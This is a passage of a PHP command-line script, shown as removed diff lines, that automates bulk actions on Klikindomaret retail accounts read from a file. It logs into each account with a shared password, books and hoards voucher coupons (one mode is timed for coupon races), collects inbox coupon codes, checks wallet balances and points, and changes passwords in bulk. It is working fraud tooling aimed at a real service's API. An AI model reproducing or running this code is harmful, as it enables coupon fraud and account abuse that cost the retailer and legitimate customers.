-											$submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"VTBMRI","TotalAmount":"' . $linkx . '","Token":"","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"Mandiri Virtual Account","IsFlashSale":"False","emailCustomer":"' . $nomor . '@klikindomaret.com","useCoin":false,"usePoint":false,"partialPointOVO":"0","potentialCoinShopee":"","Source":"MobileSite-Android","Client":"klikindomaret"}', $parcel1);
-											// echo "\n\n $submitpay[1]\n\n";
-											$k = json_decode($submitpay[1])->Trxid;
-											$lk = str_replace('TIM', '', $k);
-											//	echo shell_exec("xdg-open 'https://barcode.tec-it.com/barcode.ashx?data='$lk'&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False'");
-											$sttpay = curlx('https://api.klikindomaret.com/api/SalesOrder/GetSalesOrderHeaderListByCustomerIdAndSalesOrderNo/null?sortmode=&id=' . $ID . '&currPage=1&pageSize=30&no=&mode=0', null, $kuntul);
-											//	echo "\n\n $sttpay[1]\n\n";
-											sleep(5);
-											$sttp = json_decode($sttpay[1]);
-											$stbyr = $sttp[0]->PaymentAccountID;
-											$sttype = $sttp[0]->PaymentTypeName;
-											$sttexp = $sttp[0]->PaymentExpiredDate;
-											$TransactionCode = $sttp[0]->TransactionCode;
-											$jenenge = $sttp[0]->CustomerContactName;
-											$totale = $sttp[0]->Total;
-											$PaymentAccountID = $sttp[0]->PaymentAccountID;
-											if ($stbyr == null) {
-												$sttbayar = 'Segera cek';
-											} else {
-												$sttbayar = $stbyr;
-											}
-											echo @color('yellow', "Kode Transaksi: ");
-											echo @color('nevy', "{$TransactionCode}\n");
-											echo @color('yellow', "Kode VA: ");
-											echo @color('nevy', "{$sttbayar}\n");
-											echo @color('yellow', "Tipe Pembayaran: ");
-											echo @color('nevy', "{$sttype}\n");
-											echo @color('yellow', "PaymentExpiredDate: ");
-											echo @color('nevy', "{$sttexp}\n");
-											save("KodeTransaksi: " . $sttbayar . "|Nama: " . $jenenge . "|Nomor: " . $nomor . "|KodeToko: " . $tokonejon . "|Total: " . $totale . "\n", 'transaksimandiri.txt');
-											unlink('nganue.txt');
-											break;
-									}
-								} else {
-									echo @color('red', "{$gass[1]}\n");
-								}
-							} else {
-								echo @color('red', "{$poss[1]}\n");
-							}
-							break;
-					}
-				}
-			} else {
-				echo "{$responx}\n";
-			}
-			nyekip:
-			$no++;
-		}
-		break;
-	case '15':
-		echo "Masukkan Password : ";
-		$pw = trim(fgets(STDIN));
-		echo "Input kode Voucher: ";
-		$vocerx = trim(fgets(STDIN));
-		$vocer = strtoupper($vocerx);
-		masal22x:
-		echo "[+] Input File: ";
-		$file = trim(fgets(STDIN));
-		if (empty($file) || !file_exists($file)) {
-			echo "[+] File not found!\n";
-			goto masal22x;
-		}
-		$lines = file($file, FILE_IGNORE_NEW_LINES);
-		print_r($lines);
-		echo "Start baris ke : ";
-		$start = trim(fgets(STDIN));
-		echo "Sampai baris ke : ";
-		$endd = trim(fgets(STDIN));
-		$filex = retrieveText($file, $start, $endd);
-		$list = explode("\n", str_replace("\r", "", $filex));
-		$no = 1;
-		$total = count($list) - 1;
-		$success = 0;
-		$error = 0;
-		foreach ($list as $kode) {
-			if (empty($kode)) {
-				continue;
-			}
-			echo "Total: {$no}/{$total}\n";
-			$akunxx = explode(';', trim($kode));
-			$nomor = trim($akunxx[0]);
-			echo @color('nevy', "{$nomor}\n");
-			unlink('nganue.txt');
-			$kuntul = array();
-			$kuntul[] = 'Content-Type: application/json';
-			$kuntul[] = 'Host: api.klikindomaret.com';
-			$kuntul[] = 'User-Agent: okhttp/3.12.1';
-			$kuntul2x = array();
-			$kuntul2x[] = 'Content-Type: application/json';
-			$kuntul2x[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2x[] = 'Applicationkey: indomaret';
-			$kuntul2x[] = 'Authorization: ';
-			$kuntul2x[] = 'User-Agent: okhttp/3.12.1';
-			$verif = curlx('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=2badfdf8-5d76-4c49-81cd-c7c3588eebc4&districtID=2483&TrafficSource=', '{"Email":"' . $nomor . '","Password":"' . $pw . '"}', $kuntul2x);
-			$respi = json_decode($verif[1]);
-			$respid = $respi->ResponseID;
-			$idne = $respi->ResponseObject->ID;
-			$toked = $respi->ResponseObject->Token;
-			$kuntul2 = array();
-			$kuntul2[] = 'Content-Type: application/json';
-			$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2[] = 'Applicationkey: indomaret';
-			$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-			$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-			$cekvcne = curlx('https://account-api-v2.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul2);
-			$respon = $cekvcne[1];
-			if (strpos($respon, '"IsActivated":true')) {
-				$cok = json_decode($respon);
-				$ID = $cok[0]->ID;
-				$RegionId = $cok[0]->RegionId;
-				$storeid = $cok[0]->StoreDefault;
-				//
-				$getscid = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=00000000-0000-0000-0000-000000000000&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $storeid . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . urut(16) . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-				$za = json_decode($getscid[1]);
-				if (strpos($getscid[1], '"Message":"An error has occurred."')) {
-					echo @color('red', "ERROR KAK\n");
-				} else {
-					if ($getscid[1] == []) {
-						echo @color('red', "KERANJANG KOSONG KAK\n");
-					} else {
-						$scid = $za[0]->ID;
-						$datane = '{"Code":"' . $vocer . '","ShoppingCartID":"' . $scid . '","CustomerID":"' . $ID . '","RegionID":"' . $RegionId . '","SalesOrderNo":"","Nominal":"","DeviceID":"' . urut(16) . '","ShoppingCartPackageID":null}';
-						save("{$nomor};{$respid};{$datane}\n", $vocer . ".txt");
-						echo @color('yellow', "Tersimpan di {$vocer}.txt\n");
-					}
-				}
-				$no++;
-			} else {
-				echo @color('red', "{$respon}\n");
-			}
-		}
-		break;
-	case '16':
-		masal2zxz:
-		echo "[+] Input File: ";
-		$file = trim(fgets(STDIN));
-		if (empty($file) || !file_exists($file)) {
-			echo "[+] File not found!\n";
-			goto masal2zxz;
-		}
-		$list = explode("\n", str_replace("\r", "", file_get_contents($file)));
-		$no = 0;
-		$total = count($list) - 1;
-		$success = 0;
-		$error = 0;
-		echo "[+] JAM DOR : ";
-		$jam = trim(fgets(STDIN));
-		while (true) {
-			$time = date('Y:m:d H:i:s');
-			$day = date('Y:m:d');
-			$timestart = date('Y:m:d H:i:s');
-			//time start
-			$timeend = $day . ' ' . $jam;
-			if ($time >= $timeend) {
-				echo @color('green', "GAS !!!\n");
-				goto gascok;
-			} else {
-				echo $time . "\n";
-				sleep(1);
-			}
-		}
-		gascok:
-		foreach ($list as $kode) {
-			if (empty($kode)) {
-				continue;
-			}
-			echo "Total: {$no}/{$total}\n";
-			$akunxx = explode(';', trim($kode));
-			$nomor = trim($akunxx[0]);
-			$respid = trim($akunxx[1]);
-			$pw = trim($akunxx[2]);
-			$kuntul = array();
-			$kuntul[] = 'Content-Type: application/json';
-			$kuntul[] = 'Host: api.klikindomaret.com';
-			$kuntul[] = 'User-Agent: okhttp/3.12.1';
-			$kupon = curl('https://api.klikindomaret.com/api/Voucher/BookingVoucherCoupon?mfp_id=' . $respid, $pw, $kuntul);
-			$kimak = json_decode($kupon[1]);
-			//	die($kupon[1]);
-			$ket = $kimak->ResponseObject->keterangan;
-			if (strpos($kupon[1], '"status":"SUCCESS"')) {
-				echo @color('green', "BERHASIL GAN\n");
-				echo @color('nevy', "{$ket}\n");
-				echo @color('blue', "{$nomor}\n");
-				echo @color('yellow', "Akun berhasil disimpan di akunbervocer{$file}\n");
-				save("{$nomor}\n", "akunbervocer" . $file);
-			} else {
-				echo @color('red', "GAGAL KAK\n");
-				echo @color('red', "{$ket}\n");
-			}
-			$no++;
-		}
-		break;
-	case '17':
-		masalxdd:
-		echo "Password : ";
-		$password = trim(fgets(STDIN));
-		echo "[+] Input File: ";
-		$file = trim(fgets(STDIN));
-		if (empty($file) || !file_exists($file)) {
-			echo "[+] File not found!\n";
-			goto masalxdd;
-		}
-		$list = explode("\n", str_replace("\r", "", file_get_contents($file)));
-		$no = 0;
-		$total = count($list) - 1;
-		$success = 0;
-		$error = 0;
-		foreach ($list as $kode) {
-			if (empty($kode)) {
-				continue;
-			}
-			echo "Total: {$no}/{$total}\n";
-			unlink('nganue.txt');
-			$akunxx = explode(';', trim($kode));
-			$nomor = trim($akunxx[0]);
-			$kuntul = array();
-			$kuntul[] = 'Content-Type: application/json';
-			$kuntul[] = 'Host: api.klikindomaret.com';
-			$kuntul[] = 'User-Agent: okhttp/3.12.1';
-			$kuntul2x = array();
-			$kuntul2x[] = 'Content-Type: application/json';
-			$kuntul2x[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2x[] = 'Applicationkey: indomaret';
-			$kuntul2x[] = 'Authorization: ';
-			$kuntul2x[] = 'User-Agent: okhttp/3.12.1';
-			$verif = curlx('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=2badfdf8-5d76-4c49-81cd-c7c3588eebc4&districtID=2483&TrafficSource=', '{"Email":"' . $nomor . '","Password":"' . $password . '"}', $kuntul2x);
-			$respi = json_decode($verif[1]);
-			$respid = $respi->ResponseID;
-			$idne = $respi->ResponseObject->ID;
-			$toked = $respi->ResponseObject->Token;
-			$kuntul2 = array();
-			$kuntul2[] = 'Content-Type: application/json';
-			$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2[] = 'Applicationkey: indomaret';
-			$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-			$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-			$cekvcne = curlx('https://account-api-v2.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul2);
-			$respon = $cekvcne[1];
-			if (strpos($respon, '"IsActivated":true')) {
-				$cok = json_decode($respon);
-				$ID = $cok[0]->ID;
-				$RegionId = $cok[0]->RegionId;
-				$storeid = $cok[0]->StoreDefault;
-				$notip = curl('https://api.klikindomaret.com/api/Customer/GetInboxByUser?id=' . $ID . '&mfp_id=' . $respid . '&pages=1&NotifType=&ChildNotifType=&RangeDays=', null, $kuntul);
-				$pesan = json_decode($notip[1]);
-				foreach ($pesan[0]->InboxData as $inbox) {
-					#
-					echo @color('yellow', "Pesan   : ");
-					echo @color('nevy', $inbox->Description . "\n");
-					echo @color('yellow', "Kode	: ");
-					echo @color('nevy', $inbox->DetailInfo->CouponCode . "\n");
-					echo @color('yellow', "Berlaku : ");
-					echo @color('nevy', $inbox->DetailInfo->CouponPeriode . "\n");
-					save($nomor . ";" . $inbox->DetailInfo->CouponCode . "\n", 'KuponNotif.txt');
-					echo @color('yellow', "Tersimpan di KuponNotif.txt\n");
-				}
-				$no++;
-			} else {
-				echo @color('red', $respon . "\n");
-			}
-		}
-		break;
-	case '18':
-		echo @color('red', "Tidak disarankan untuk kupon rebutan\n");
-		echo @color('nevy', "Pastikan sudah menyimpan list multi kupon terlebih dahulu\n");
-		echo "Masukkan Password : ";
-		$pw = trim(fgets(STDIN));
-		masalsasax:
-		echo "[+] Input File AKUN : ";
-		$file = trim(fgets(STDIN));
-		if (empty($file) || !file_exists($file)) {
-			echo "[+] File not found!\n";
-			goto masalsasax;
-		}
-		$lines = file($file, FILE_IGNORE_NEW_LINES);
-		print_r($lines);
-		echo "Start baris ke : ";
-		$start = trim(fgets(STDIN));
-		echo "Sampai baris ke : ";
-		$endd = trim(fgets(STDIN));
-		$filex = retrieveText($file, $start, $endd);
-		$list = explode("\n", str_replace("\r", "", $filex));
-		$no = 1;
-		$total = count($list) - 1;
-		$success = 0;
-		$error = 0;
-		foreach ($list as $kode) {
-			if (empty($kode)) {
-				continue;
-			}
-			echo "Total: {$no}/{$total}\n";
-			unlink('nganue.txt');
-			$akunxx = explode(';', trim($kode));
-			$nomor = trim($akunxx[0]);
-			echo @color('nevy', "{$nomor}\n");
-			$kuntul = array();
-			$kuntul[] = 'Content-Type: application/json';
-			$kuntul[] = 'Host: api.klikindomaret.com';
-			$kuntul[] = 'User-Agent: okhttp/3.12.1';
-			$kuntul2x = array();
-			$kuntul2x[] = 'Content-Type: application/json';
-			$kuntul2x[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2x[] = 'Applicationkey: indomaret';
-			$kuntul2x[] = 'Authorization: ';
-			$kuntul2x[] = 'User-Agent: okhttp/3.12.1';
-			$verif = curlx('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=2badfdf8-5d76-4c49-81cd-c7c3588eebc4&districtID=2483&TrafficSource=', '{"Email":"' . $nomor . '","Password":"' . $pw . '"}', $kuntul2x);
-			$respi = json_decode($verif[1]);
-			$respid = $respi->ResponseID;
-			$idne = $respi->ResponseObject->ID;
-			$toked = $respi->ResponseObject->Token;
-			$kuntul2 = array();
-			$kuntul2[] = 'Content-Type: application/json';
-			$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2[] = 'Applicationkey: indomaret';
-			$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-			$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-			$cekvcne = curlx('https://account-api-v2.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul2);
-			$respon = $cekvcne[1];
-			if (strpos($respon, '"IsActivated":true')) {
-				$cok = json_decode($respon);
-				$ID = $cok[0]->ID;
-				$RegionId = $cok[0]->RegionId;
-				$storeid = $cok[0]->StoreDefault;
-				//
-				$getscid = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=00000000-0000-0000-0000-000000000000&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $storeid . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . urut(16) . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-				$za = json_decode($getscid[1]);
-				if (strpos($getscid[1], '"Message":"An error has occurred."')) {
-					echo @color('red', "ERROR KAK\n");
-				} else {
-					$scid = $za[0]->ID;
-					$listx = explode("\n", str_replace("\r", "", file_get_contents('multi.txt')));
-					foreach ($listx as $kodex) {
-						if (empty($kodex)) {
-							continue;
-						}
-						$akunxxx = explode(';', trim($kodex));
-						$multix = trim($akunxxx[0]);
-						$multi = strtoupper($multix);
-						$kupon = curlx('https://api.klikindomaret.com/api/Voucher/BookingVoucherCoupon?mfp_id=' . $respid, '{"Code":"' . $multi . '","ShoppingCartID":"' . $scid . '","CustomerID":"' . $ID . '","RegionID":"' . $RegionId . '","SalesOrderNo":"","Nominal":"","DeviceID":"' . urut(16) . '","ShoppingCartPackageID":null}', $kuntul);
-						$kimak = json_decode($kupon[1]);
-						$ket = $kimak->ResponseObject->keterangan;
-						if (strpos($kupon[1], '"status":"SUCCESS"')) {
-							echo @color('green', "BERHASIL GAN\n");
-							echo @color('yellow', "Kupon : ");
-							echo @color('nevy', "{$multi}\n");
-							echo @color('nevy', "{$ket}\n");
-							echo @color('yellow', "Akun berhasil disimpan di akunbervocermulti.txt\n");
-							save("{$nomor}\n", "akunbervocermulti.txt");
-						} else {
-							echo @color('red', "GAGAL KAK\n");
-							echo @color('red', "{$ket}\n");
-						}
-					}
-					$linesx = file('akunbervocermulti.txt');
-					$linesx = array_unique($linesx);
-				}
-				$no++;
-			} else {
-				echo @color('red', "{$respon}\n");
-			}
-		}
-		break;
-	case '19':
-		echo "Masukkan Password : ";
-		$password = trim(fgets(STDIN));
-		masal12a:
-		echo "[+] Input File: ";
-		$file = trim(fgets(STDIN));
-		if (empty($file) || !file_exists($file)) {
-			echo "[+] File not found!\n";
-			goto masal12a;
-		}
-		$lines = file($file, FILE_IGNORE_NEW_LINES);
-		print_r($lines);
-		echo "Start baris ke : ";
-		$start = trim(fgets(STDIN));
-		echo "Sampai baris ke : ";
-		$endd = trim(fgets(STDIN));
-		$filex = retrieveText($file, $start, $endd);
-		$list = explode("\n", str_replace("\r", "", $filex));
-		$no = 1;
-		$total = count($list) - 1;
-		$success = 0;
-		$error = 0;
-		foreach ($list as $kode) {
-			if (empty($kode)) {
-				continue;
-			}
-			echo "Total: {$no}/{$total}\n";
-			unlink('nganue.txt');
-			$akunxx = explode(';', trim($kode));
-			$nomor = trim($akunxx[0]);
-			echo @color('nevy', "{$nomor}\n");
-			$kuntul = array();
-			$kuntul[] = 'Content-Type: application/json';
-			$kuntul[] = 'Host: api.klikindomaret.com';
-			$kuntul[] = 'User-Agent: okhttp/3.12.1';
-			$kuntul2x = array();
-			$kuntul2x[] = 'Content-Type: application/json';
-			$kuntul2x[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2x[] = 'Applicationkey: indomaret';
-			$kuntul2x[] = 'Authorization: ';
-			$kuntul2x[] = 'User-Agent: okhttp/3.12.1';
-			$verif = curlx('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=2badfdf8-5d76-4c49-81cd-c7c3588eebc4&districtID=2483&TrafficSource=', '{"Email":"' . $nomor . '","Password":"' . $password . '"}', $kuntul2x);
-			$respi = json_decode($verif[1]);
-			$respid = $respi->ResponseID;
-			$idne = $respi->ResponseObject->ID;
-			$toked = $respi->ResponseObject->Token;
-			$kuntul2 = array();
-			$kuntul2[] = 'Content-Type: application/json';
-			$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2[] = 'Applicationkey: indomaret';
-			$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-			$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-			$cekvcne = curlx('https://account-api-v2.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul2);
-			$responx = $cekvcne[1];
-			if (strpos($responx, '"IsActivated":true')) {
-				$cok = json_decode($responx);
-				$ID = $cok[0]->ID;
-				$RegionId = $cok[0]->RegionId;
-				$saldoklik = curlx('https://account-api-v2.klikindomaret.com/api/loyalty/checksaldoklik?CustomerID=' . $ID, null, $kuntul2);
-				$salklik = json_decode($saldoklik[1])[0]->Saldo;
-				if ($salklik !== '0') {
-					save("{$nomor} => {$salklik}\n", 'adasaldoklik.txt');
-					echo "Tersimpan di adasaldoklik.txt\n";
-				}
-				$saldoisaku = curlx('https://account-api-v2.klikindomaret.com/api/Loyalty/CheckPoint?CustomerID=' . $ID . '&Source=IOS&Type=ISAKU', null, $kuntul2);
-				$salisaku = json_decode($saldoisaku[1])[0]->Saldo;
-				$mypoin = curlx('https://account-api-v2.klikindomaret.com/api/Loyalty/CheckPoint?CustomerID=' . $ID . '&Source=IOS&Type=MYPOINT', null, $kuntul2);
-				$poinku = json_decode($mypoin[1])[0]->Point;
-				echo @color('yellow', "Saldo Klik : ");
-				echo @color('nevy', "{$salklik}\n");
-				echo @color('yellow', "Saldo Isaku : ");
-				echo @color('nevy', "{$salisaku}\n");
-				echo @color('yellow', "POINKU : ");
-				echo @color('nevy', "{$poinku}\n");
-				$no++;
-			} else {
-				echo @color('red', "{$responx}\n");
-			}
-		}
-		break;
-	case '20':
-		echo "Masukkan Password : ";
-		$password = trim(fgets(STDIN));
-		masalsdsd:
-		echo "[+] Input File: ";
-		$file = trim(fgets(STDIN));
-		if (empty($file) || !file_exists($file)) {
-			echo "[+] File not found!\n";
-			goto masalsdsd;
-		}
-		$lines = file($file, FILE_IGNORE_NEW_LINES);
-		print_r($lines);
-		echo "Start baris ke : ";
-		$start = trim(fgets(STDIN));
-		echo "Sampai baris ke : ";
-		$endd = trim(fgets(STDIN));
-		$filex = retrieveText($file, $start, $endd);
-		$list = explode("\n", str_replace("\r", "", $filex));
-		$no = 1;
-		$total = count($list) - 1;
-		$success = 0;
-		$error = 0;
-		foreach ($list as $kode) {
-			if (empty($kode)) {
-				continue;
-			}
-			echo "Total: {$no}/{$total}\n";
-			unlink('nganue.txt');
-			$akunxx = explode(';', trim($kode));
-			$nomor = trim($akunxx[0]);
-			echo @color('nevy', "{$nomor}\n");
-			$kuntul = array();
-			$kuntul[] = 'Content-Type: application/json';
-			$kuntul[] = 'Host: api.klikindomaret.com';
-			$kuntul[] = 'User-Agent: okhttp/3.12.1';
-			$kuntul2x = array();
-			$kuntul2x[] = 'Content-Type: application/json';
-			$kuntul2x[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2x[] = 'Applicationkey: indomaret';
-			$kuntul2x[] = 'Authorization: ';
-			$kuntul2x[] = 'User-Agent: okhttp/3.12.1';
-			$verif = curlx('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=2badfdf8-5d76-4c49-81cd-c7c3588eebc4&districtID=2483&TrafficSource=', '{"Email":"' . $nomor . '","Password":"' . $password . '"}', $kuntul2x);
-			$respi = json_decode($verif[1]);
-			$respid = $respi->ResponseID;
-			$idne = $respi->ResponseObject->ID;
-			$toked = $respi->ResponseObject->Token;
-			$kuntul2 = array();
-			$kuntul2[] = 'Content-Type: application/json';
-			$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2[] = 'Applicationkey: indomaret';
-			$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-			$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-			$cekvcne = curlx('https://account-api-v2.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul2);
-			$responx = $cekvcne[1];
-			if (strpos($responx, '"IsActivated":true')) {
-				$cok = json_decode($responx);
-				$ID = $cok[0]->ID;
-				$RegionId = $cok[0]->RegionId;
-				$storeid = $cok[0]->StoreDefault;
-				$getscid = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=00000000-0000-0000-0000-000000000000&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $storeid . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . urut(16) . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-				$za = json_decode($getscid[1]);
-				if (strpos($getscid[1], '"Message":"An error has occurred."')) {
-					echo @color('red', "ERROR KAK\n");
-				} else {
-					$scid = $za[0]->ID;
-					$toko = $cok[0]->StoreDefault;
-					$cekk = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=' . $scid . '&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $toko . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . urut(16) . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-					$json = json_decode($cekk[1]);
-					if ($json[0]->CartItemNotification->ListCouponPotonganTotal == []) {
-						echo @color('red', "KUPON KOSONG KAK\n");
-					} else {
-						$jumlah = count($json[0]->CartItemNotification->ListCouponPotonganTotal);
-						echo @color('yellow', "Jumlah Kupon : ");
-						echo @color('green', "{$jumlah}\n");
-						foreach ($json[0]->CartItemNotification->ListCouponPotonganTotal as $mydata) {
-							$kupon = $mydata->CouponMask;
-							$desk = $mydata->CouponMekanisme;
-							//echo "Nama Kupon : $kupon\n";
-							echo @color('yellow', "Nama Kupon   : ");
-							echo @color('green', "{$kupon}\n");
-							echo @color('yellow', "Keterangan   : ");
-							echo @color('blue', "{$desk}\n");
-							$hapus = curlx('https://api.klikindomaret.com/api/Voucher/ReversalVoucherCoupon?mfp_id=' . $respid, '{"CustomerID":"' . $ID . '","Code":"' . $kupon . '","SalesOrderNo":"","Nominal":"","RegionID":"' . $RegionId . '","ShoppingCartID":"' . $scid . '","ShoppingCartPackageID":null}', $kuntul);
-							$mb = json_decode($hapus[1]);
-							if (strpos($hapus[1], '"status":"SUCCESS"')) {
-								$ket = $mb->ResponseObject->keterangan;
-								echo @color('yellow', "Nama Kupon   : ");
-								echo @color('green', "{$kupon}\n");
-								echo @color('green', "SUKSES HAPUS KAK\n");
-								echo @color('green', "{$ket}\n");
-							} else {
-								echo @color('red', "{$kupon}\n");
-								echo @color('red', "GAGAL HAPUS KAK\n");
-								echo @color('red', "{$ket}\n");
-							}
-						}
-					}
-				}
-				echo "\n";
-				lanjot:
-				$no++;
-			} else {
-				echo "{$responx}\n";
-			}
-		}
-		break;
-	case '21':
-		echo "Masukkan Password : ";
-		$password = trim(fgets(STDIN));
-		masalesax:
-		echo "[+] Input File: ";
-		$file = trim(fgets(STDIN));
-		echo "Masukkan Password BARU : ";
-		$passwd = trim(fgets(STDIN));
-		if (empty($file) || !file_exists($file)) {
-			echo "[+] File not found!\n";
-			goto masalesax;
-		}
-		$lines = file($file, FILE_IGNORE_NEW_LINES);
-		print_r($lines);
-		echo "Start baris ke : ";
-		$start = trim(fgets(STDIN));
-		echo "Sampai baris ke : ";
-		$endd = trim(fgets(STDIN));
-		$filex = retrieveText($file, $start, $endd);
-		$list = explode("\n", str_replace("\r", "", $filex));
-		$no = 1;
-		$total = count($list) - 1;
-		$success = 0;
-		$error = 0;
-		foreach ($list as $kode) {
-			if (empty($kode)) {
-				continue;
-			}
-			echo "Total: {$no}/{$total}\n";
-			unlink('nganue.txt');
-			$akunxx = explode(';', trim($kode));
-			$nomor = trim($akunxx[0]);
-			echo @color('nevy', "{$nomor}\n");
-			$kuntul = array();
-			$kuntul[] = 'Content-Type: application/json';
-			$kuntul[] = 'Host: api.klikindomaret.com';
-			$kuntul[] = 'User-Agent: okhttp/3.12.1';
-			$kuntul2x = array();
-			$kuntul2x[] = 'Content-Type: application/json';
-			$kuntul2x[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2x[] = 'Applicationkey: indomaret';
-			$kuntul2x[] = 'Authorization: ';
-			$kuntul2x[] = 'User-Agent: okhttp/3.12.1';
-			$verif = curlx('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=2badfdf8-5d76-4c49-81cd-c7c3588eebc4&districtID=2483&TrafficSource=', '{"Email":"' . $nomor . '","Password":"' . $password . '"}', $kuntul2x);
-			$respi = json_decode($verif[1]);
-			$respid = $respi->ResponseID;
-			$idne = $respi->ResponseObject->ID;
-			$toked = $respi->ResponseObject->Token;
-			$kuntul2 = array();
-			$kuntul2[] = 'Content-Type: application/json';
-			$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2[] = 'Applicationkey: indomaret';
-			$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-			$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-			$cekvcne = curlx('https://account-api-v2.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul2);
-			$responx = $cekvcne[1];
-			if (strpos($responx, '"IsActivated":true')) {
-				$cok = json_decode($responx);
-				$ID = $cok[0]->ID;
-				$RegionId = $cok[0]->RegionId;
-				$toko = $cok[0]->StoreDefault;
-				$cekk = curlx('https://account-api-v2.klikindomaret.com/api/Customer/UpdatePasswordViaMobileApps?mfp_id=' . $respid, '{"ID":"' . $ID . '","Password":"' . $password . '","NewPassword":"' . $passwd . '","ConfirmPassword":"' . $passwd . '"}', $kuntul2);
-				$json = json_decode($cekk[1]);
-				if (strpos($cekk[1], '"IsSuccess":true')) {
-					echo @color('green', "Sukses Update password\n");
-					save($nomor . "\n", 'Sandi-' . $passwd . '.txt');
-					echo @color('yellow', "Tersimpan di Sandi-{$passwd}.txt\n");
-				} else {
-					echo @color('red', "GAGAL Update password\n");
-					save($nomor . "\n", 'gagalubah.txt');
-					echo @color('yellow', "Tersimpan di gagalubah.txt\n");
-				}
-				$no++;
-			} else {
-				echo @color('red', "GAGAL Update password\n");
-				save($nomor . "\n", 'gagalubah.txt');
-				echo @color('yellow', "Tersimpan di gagalubah.txt\n");
-			}
-		}
-		break;
-	case '22':
-		echo "Masukkan Password : ";
-		$password = trim(fgets(STDIN));
-		echo "Masukkan Nama Depan : ";
-		$jenengd = trim(fgets(STDIN));
-		masalsdsd1:
-		echo "[+] Input File: ";
-		$file = trim(fgets(STDIN));
-		if (empty($file) || !file_exists($file)) {
-			echo "[+] File not found!\n";
-			goto masalsdsd1;
-		}
-		$lines = file($file, FILE_IGNORE_NEW_LINES);
-		print_r($lines);
-		echo "Start baris ke : ";
-		$start = trim(fgets(STDIN));
-		echo "Sampai baris ke : ";
-		$endd = trim(fgets(STDIN));
-		$filex = retrieveText($file, $start, $endd);
-		$list = explode("\n", str_replace("\r", "", $filex));
-		$no = 1;
-		$total = count($list) - 1;
-		$success = 0;
-		$error = 0;
-		foreach ($list as $kode) {
-			if (empty($kode)) {
-				continue;
-			}
-			echo "Total: {$no}/{$total}\n";
-			unlink('nganue.txt');
-			$akunxx = explode(';', trim($kode));
-			$nomor = trim($akunxx[0]);
-			echo @color('nevy', "{$nomor}\n");
-			$kuntul = array();
-			$kuntul[] = 'Content-Type: application/json';
-			$kuntul[] = 'Host: api.klikindomaret.com';
-			$kuntul[] = 'User-Agent: okhttp/3.12.1';
-			$kuntul2x = array();
-			$kuntul2x[] = 'Content-Type: application/json';
-			$kuntul2x[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2x[] = 'Applicationkey: indomaret';
-			$kuntul2x[] = 'Authorization: ';
-			$kuntul2x[] = 'User-Agent: okhttp/3.12.1';
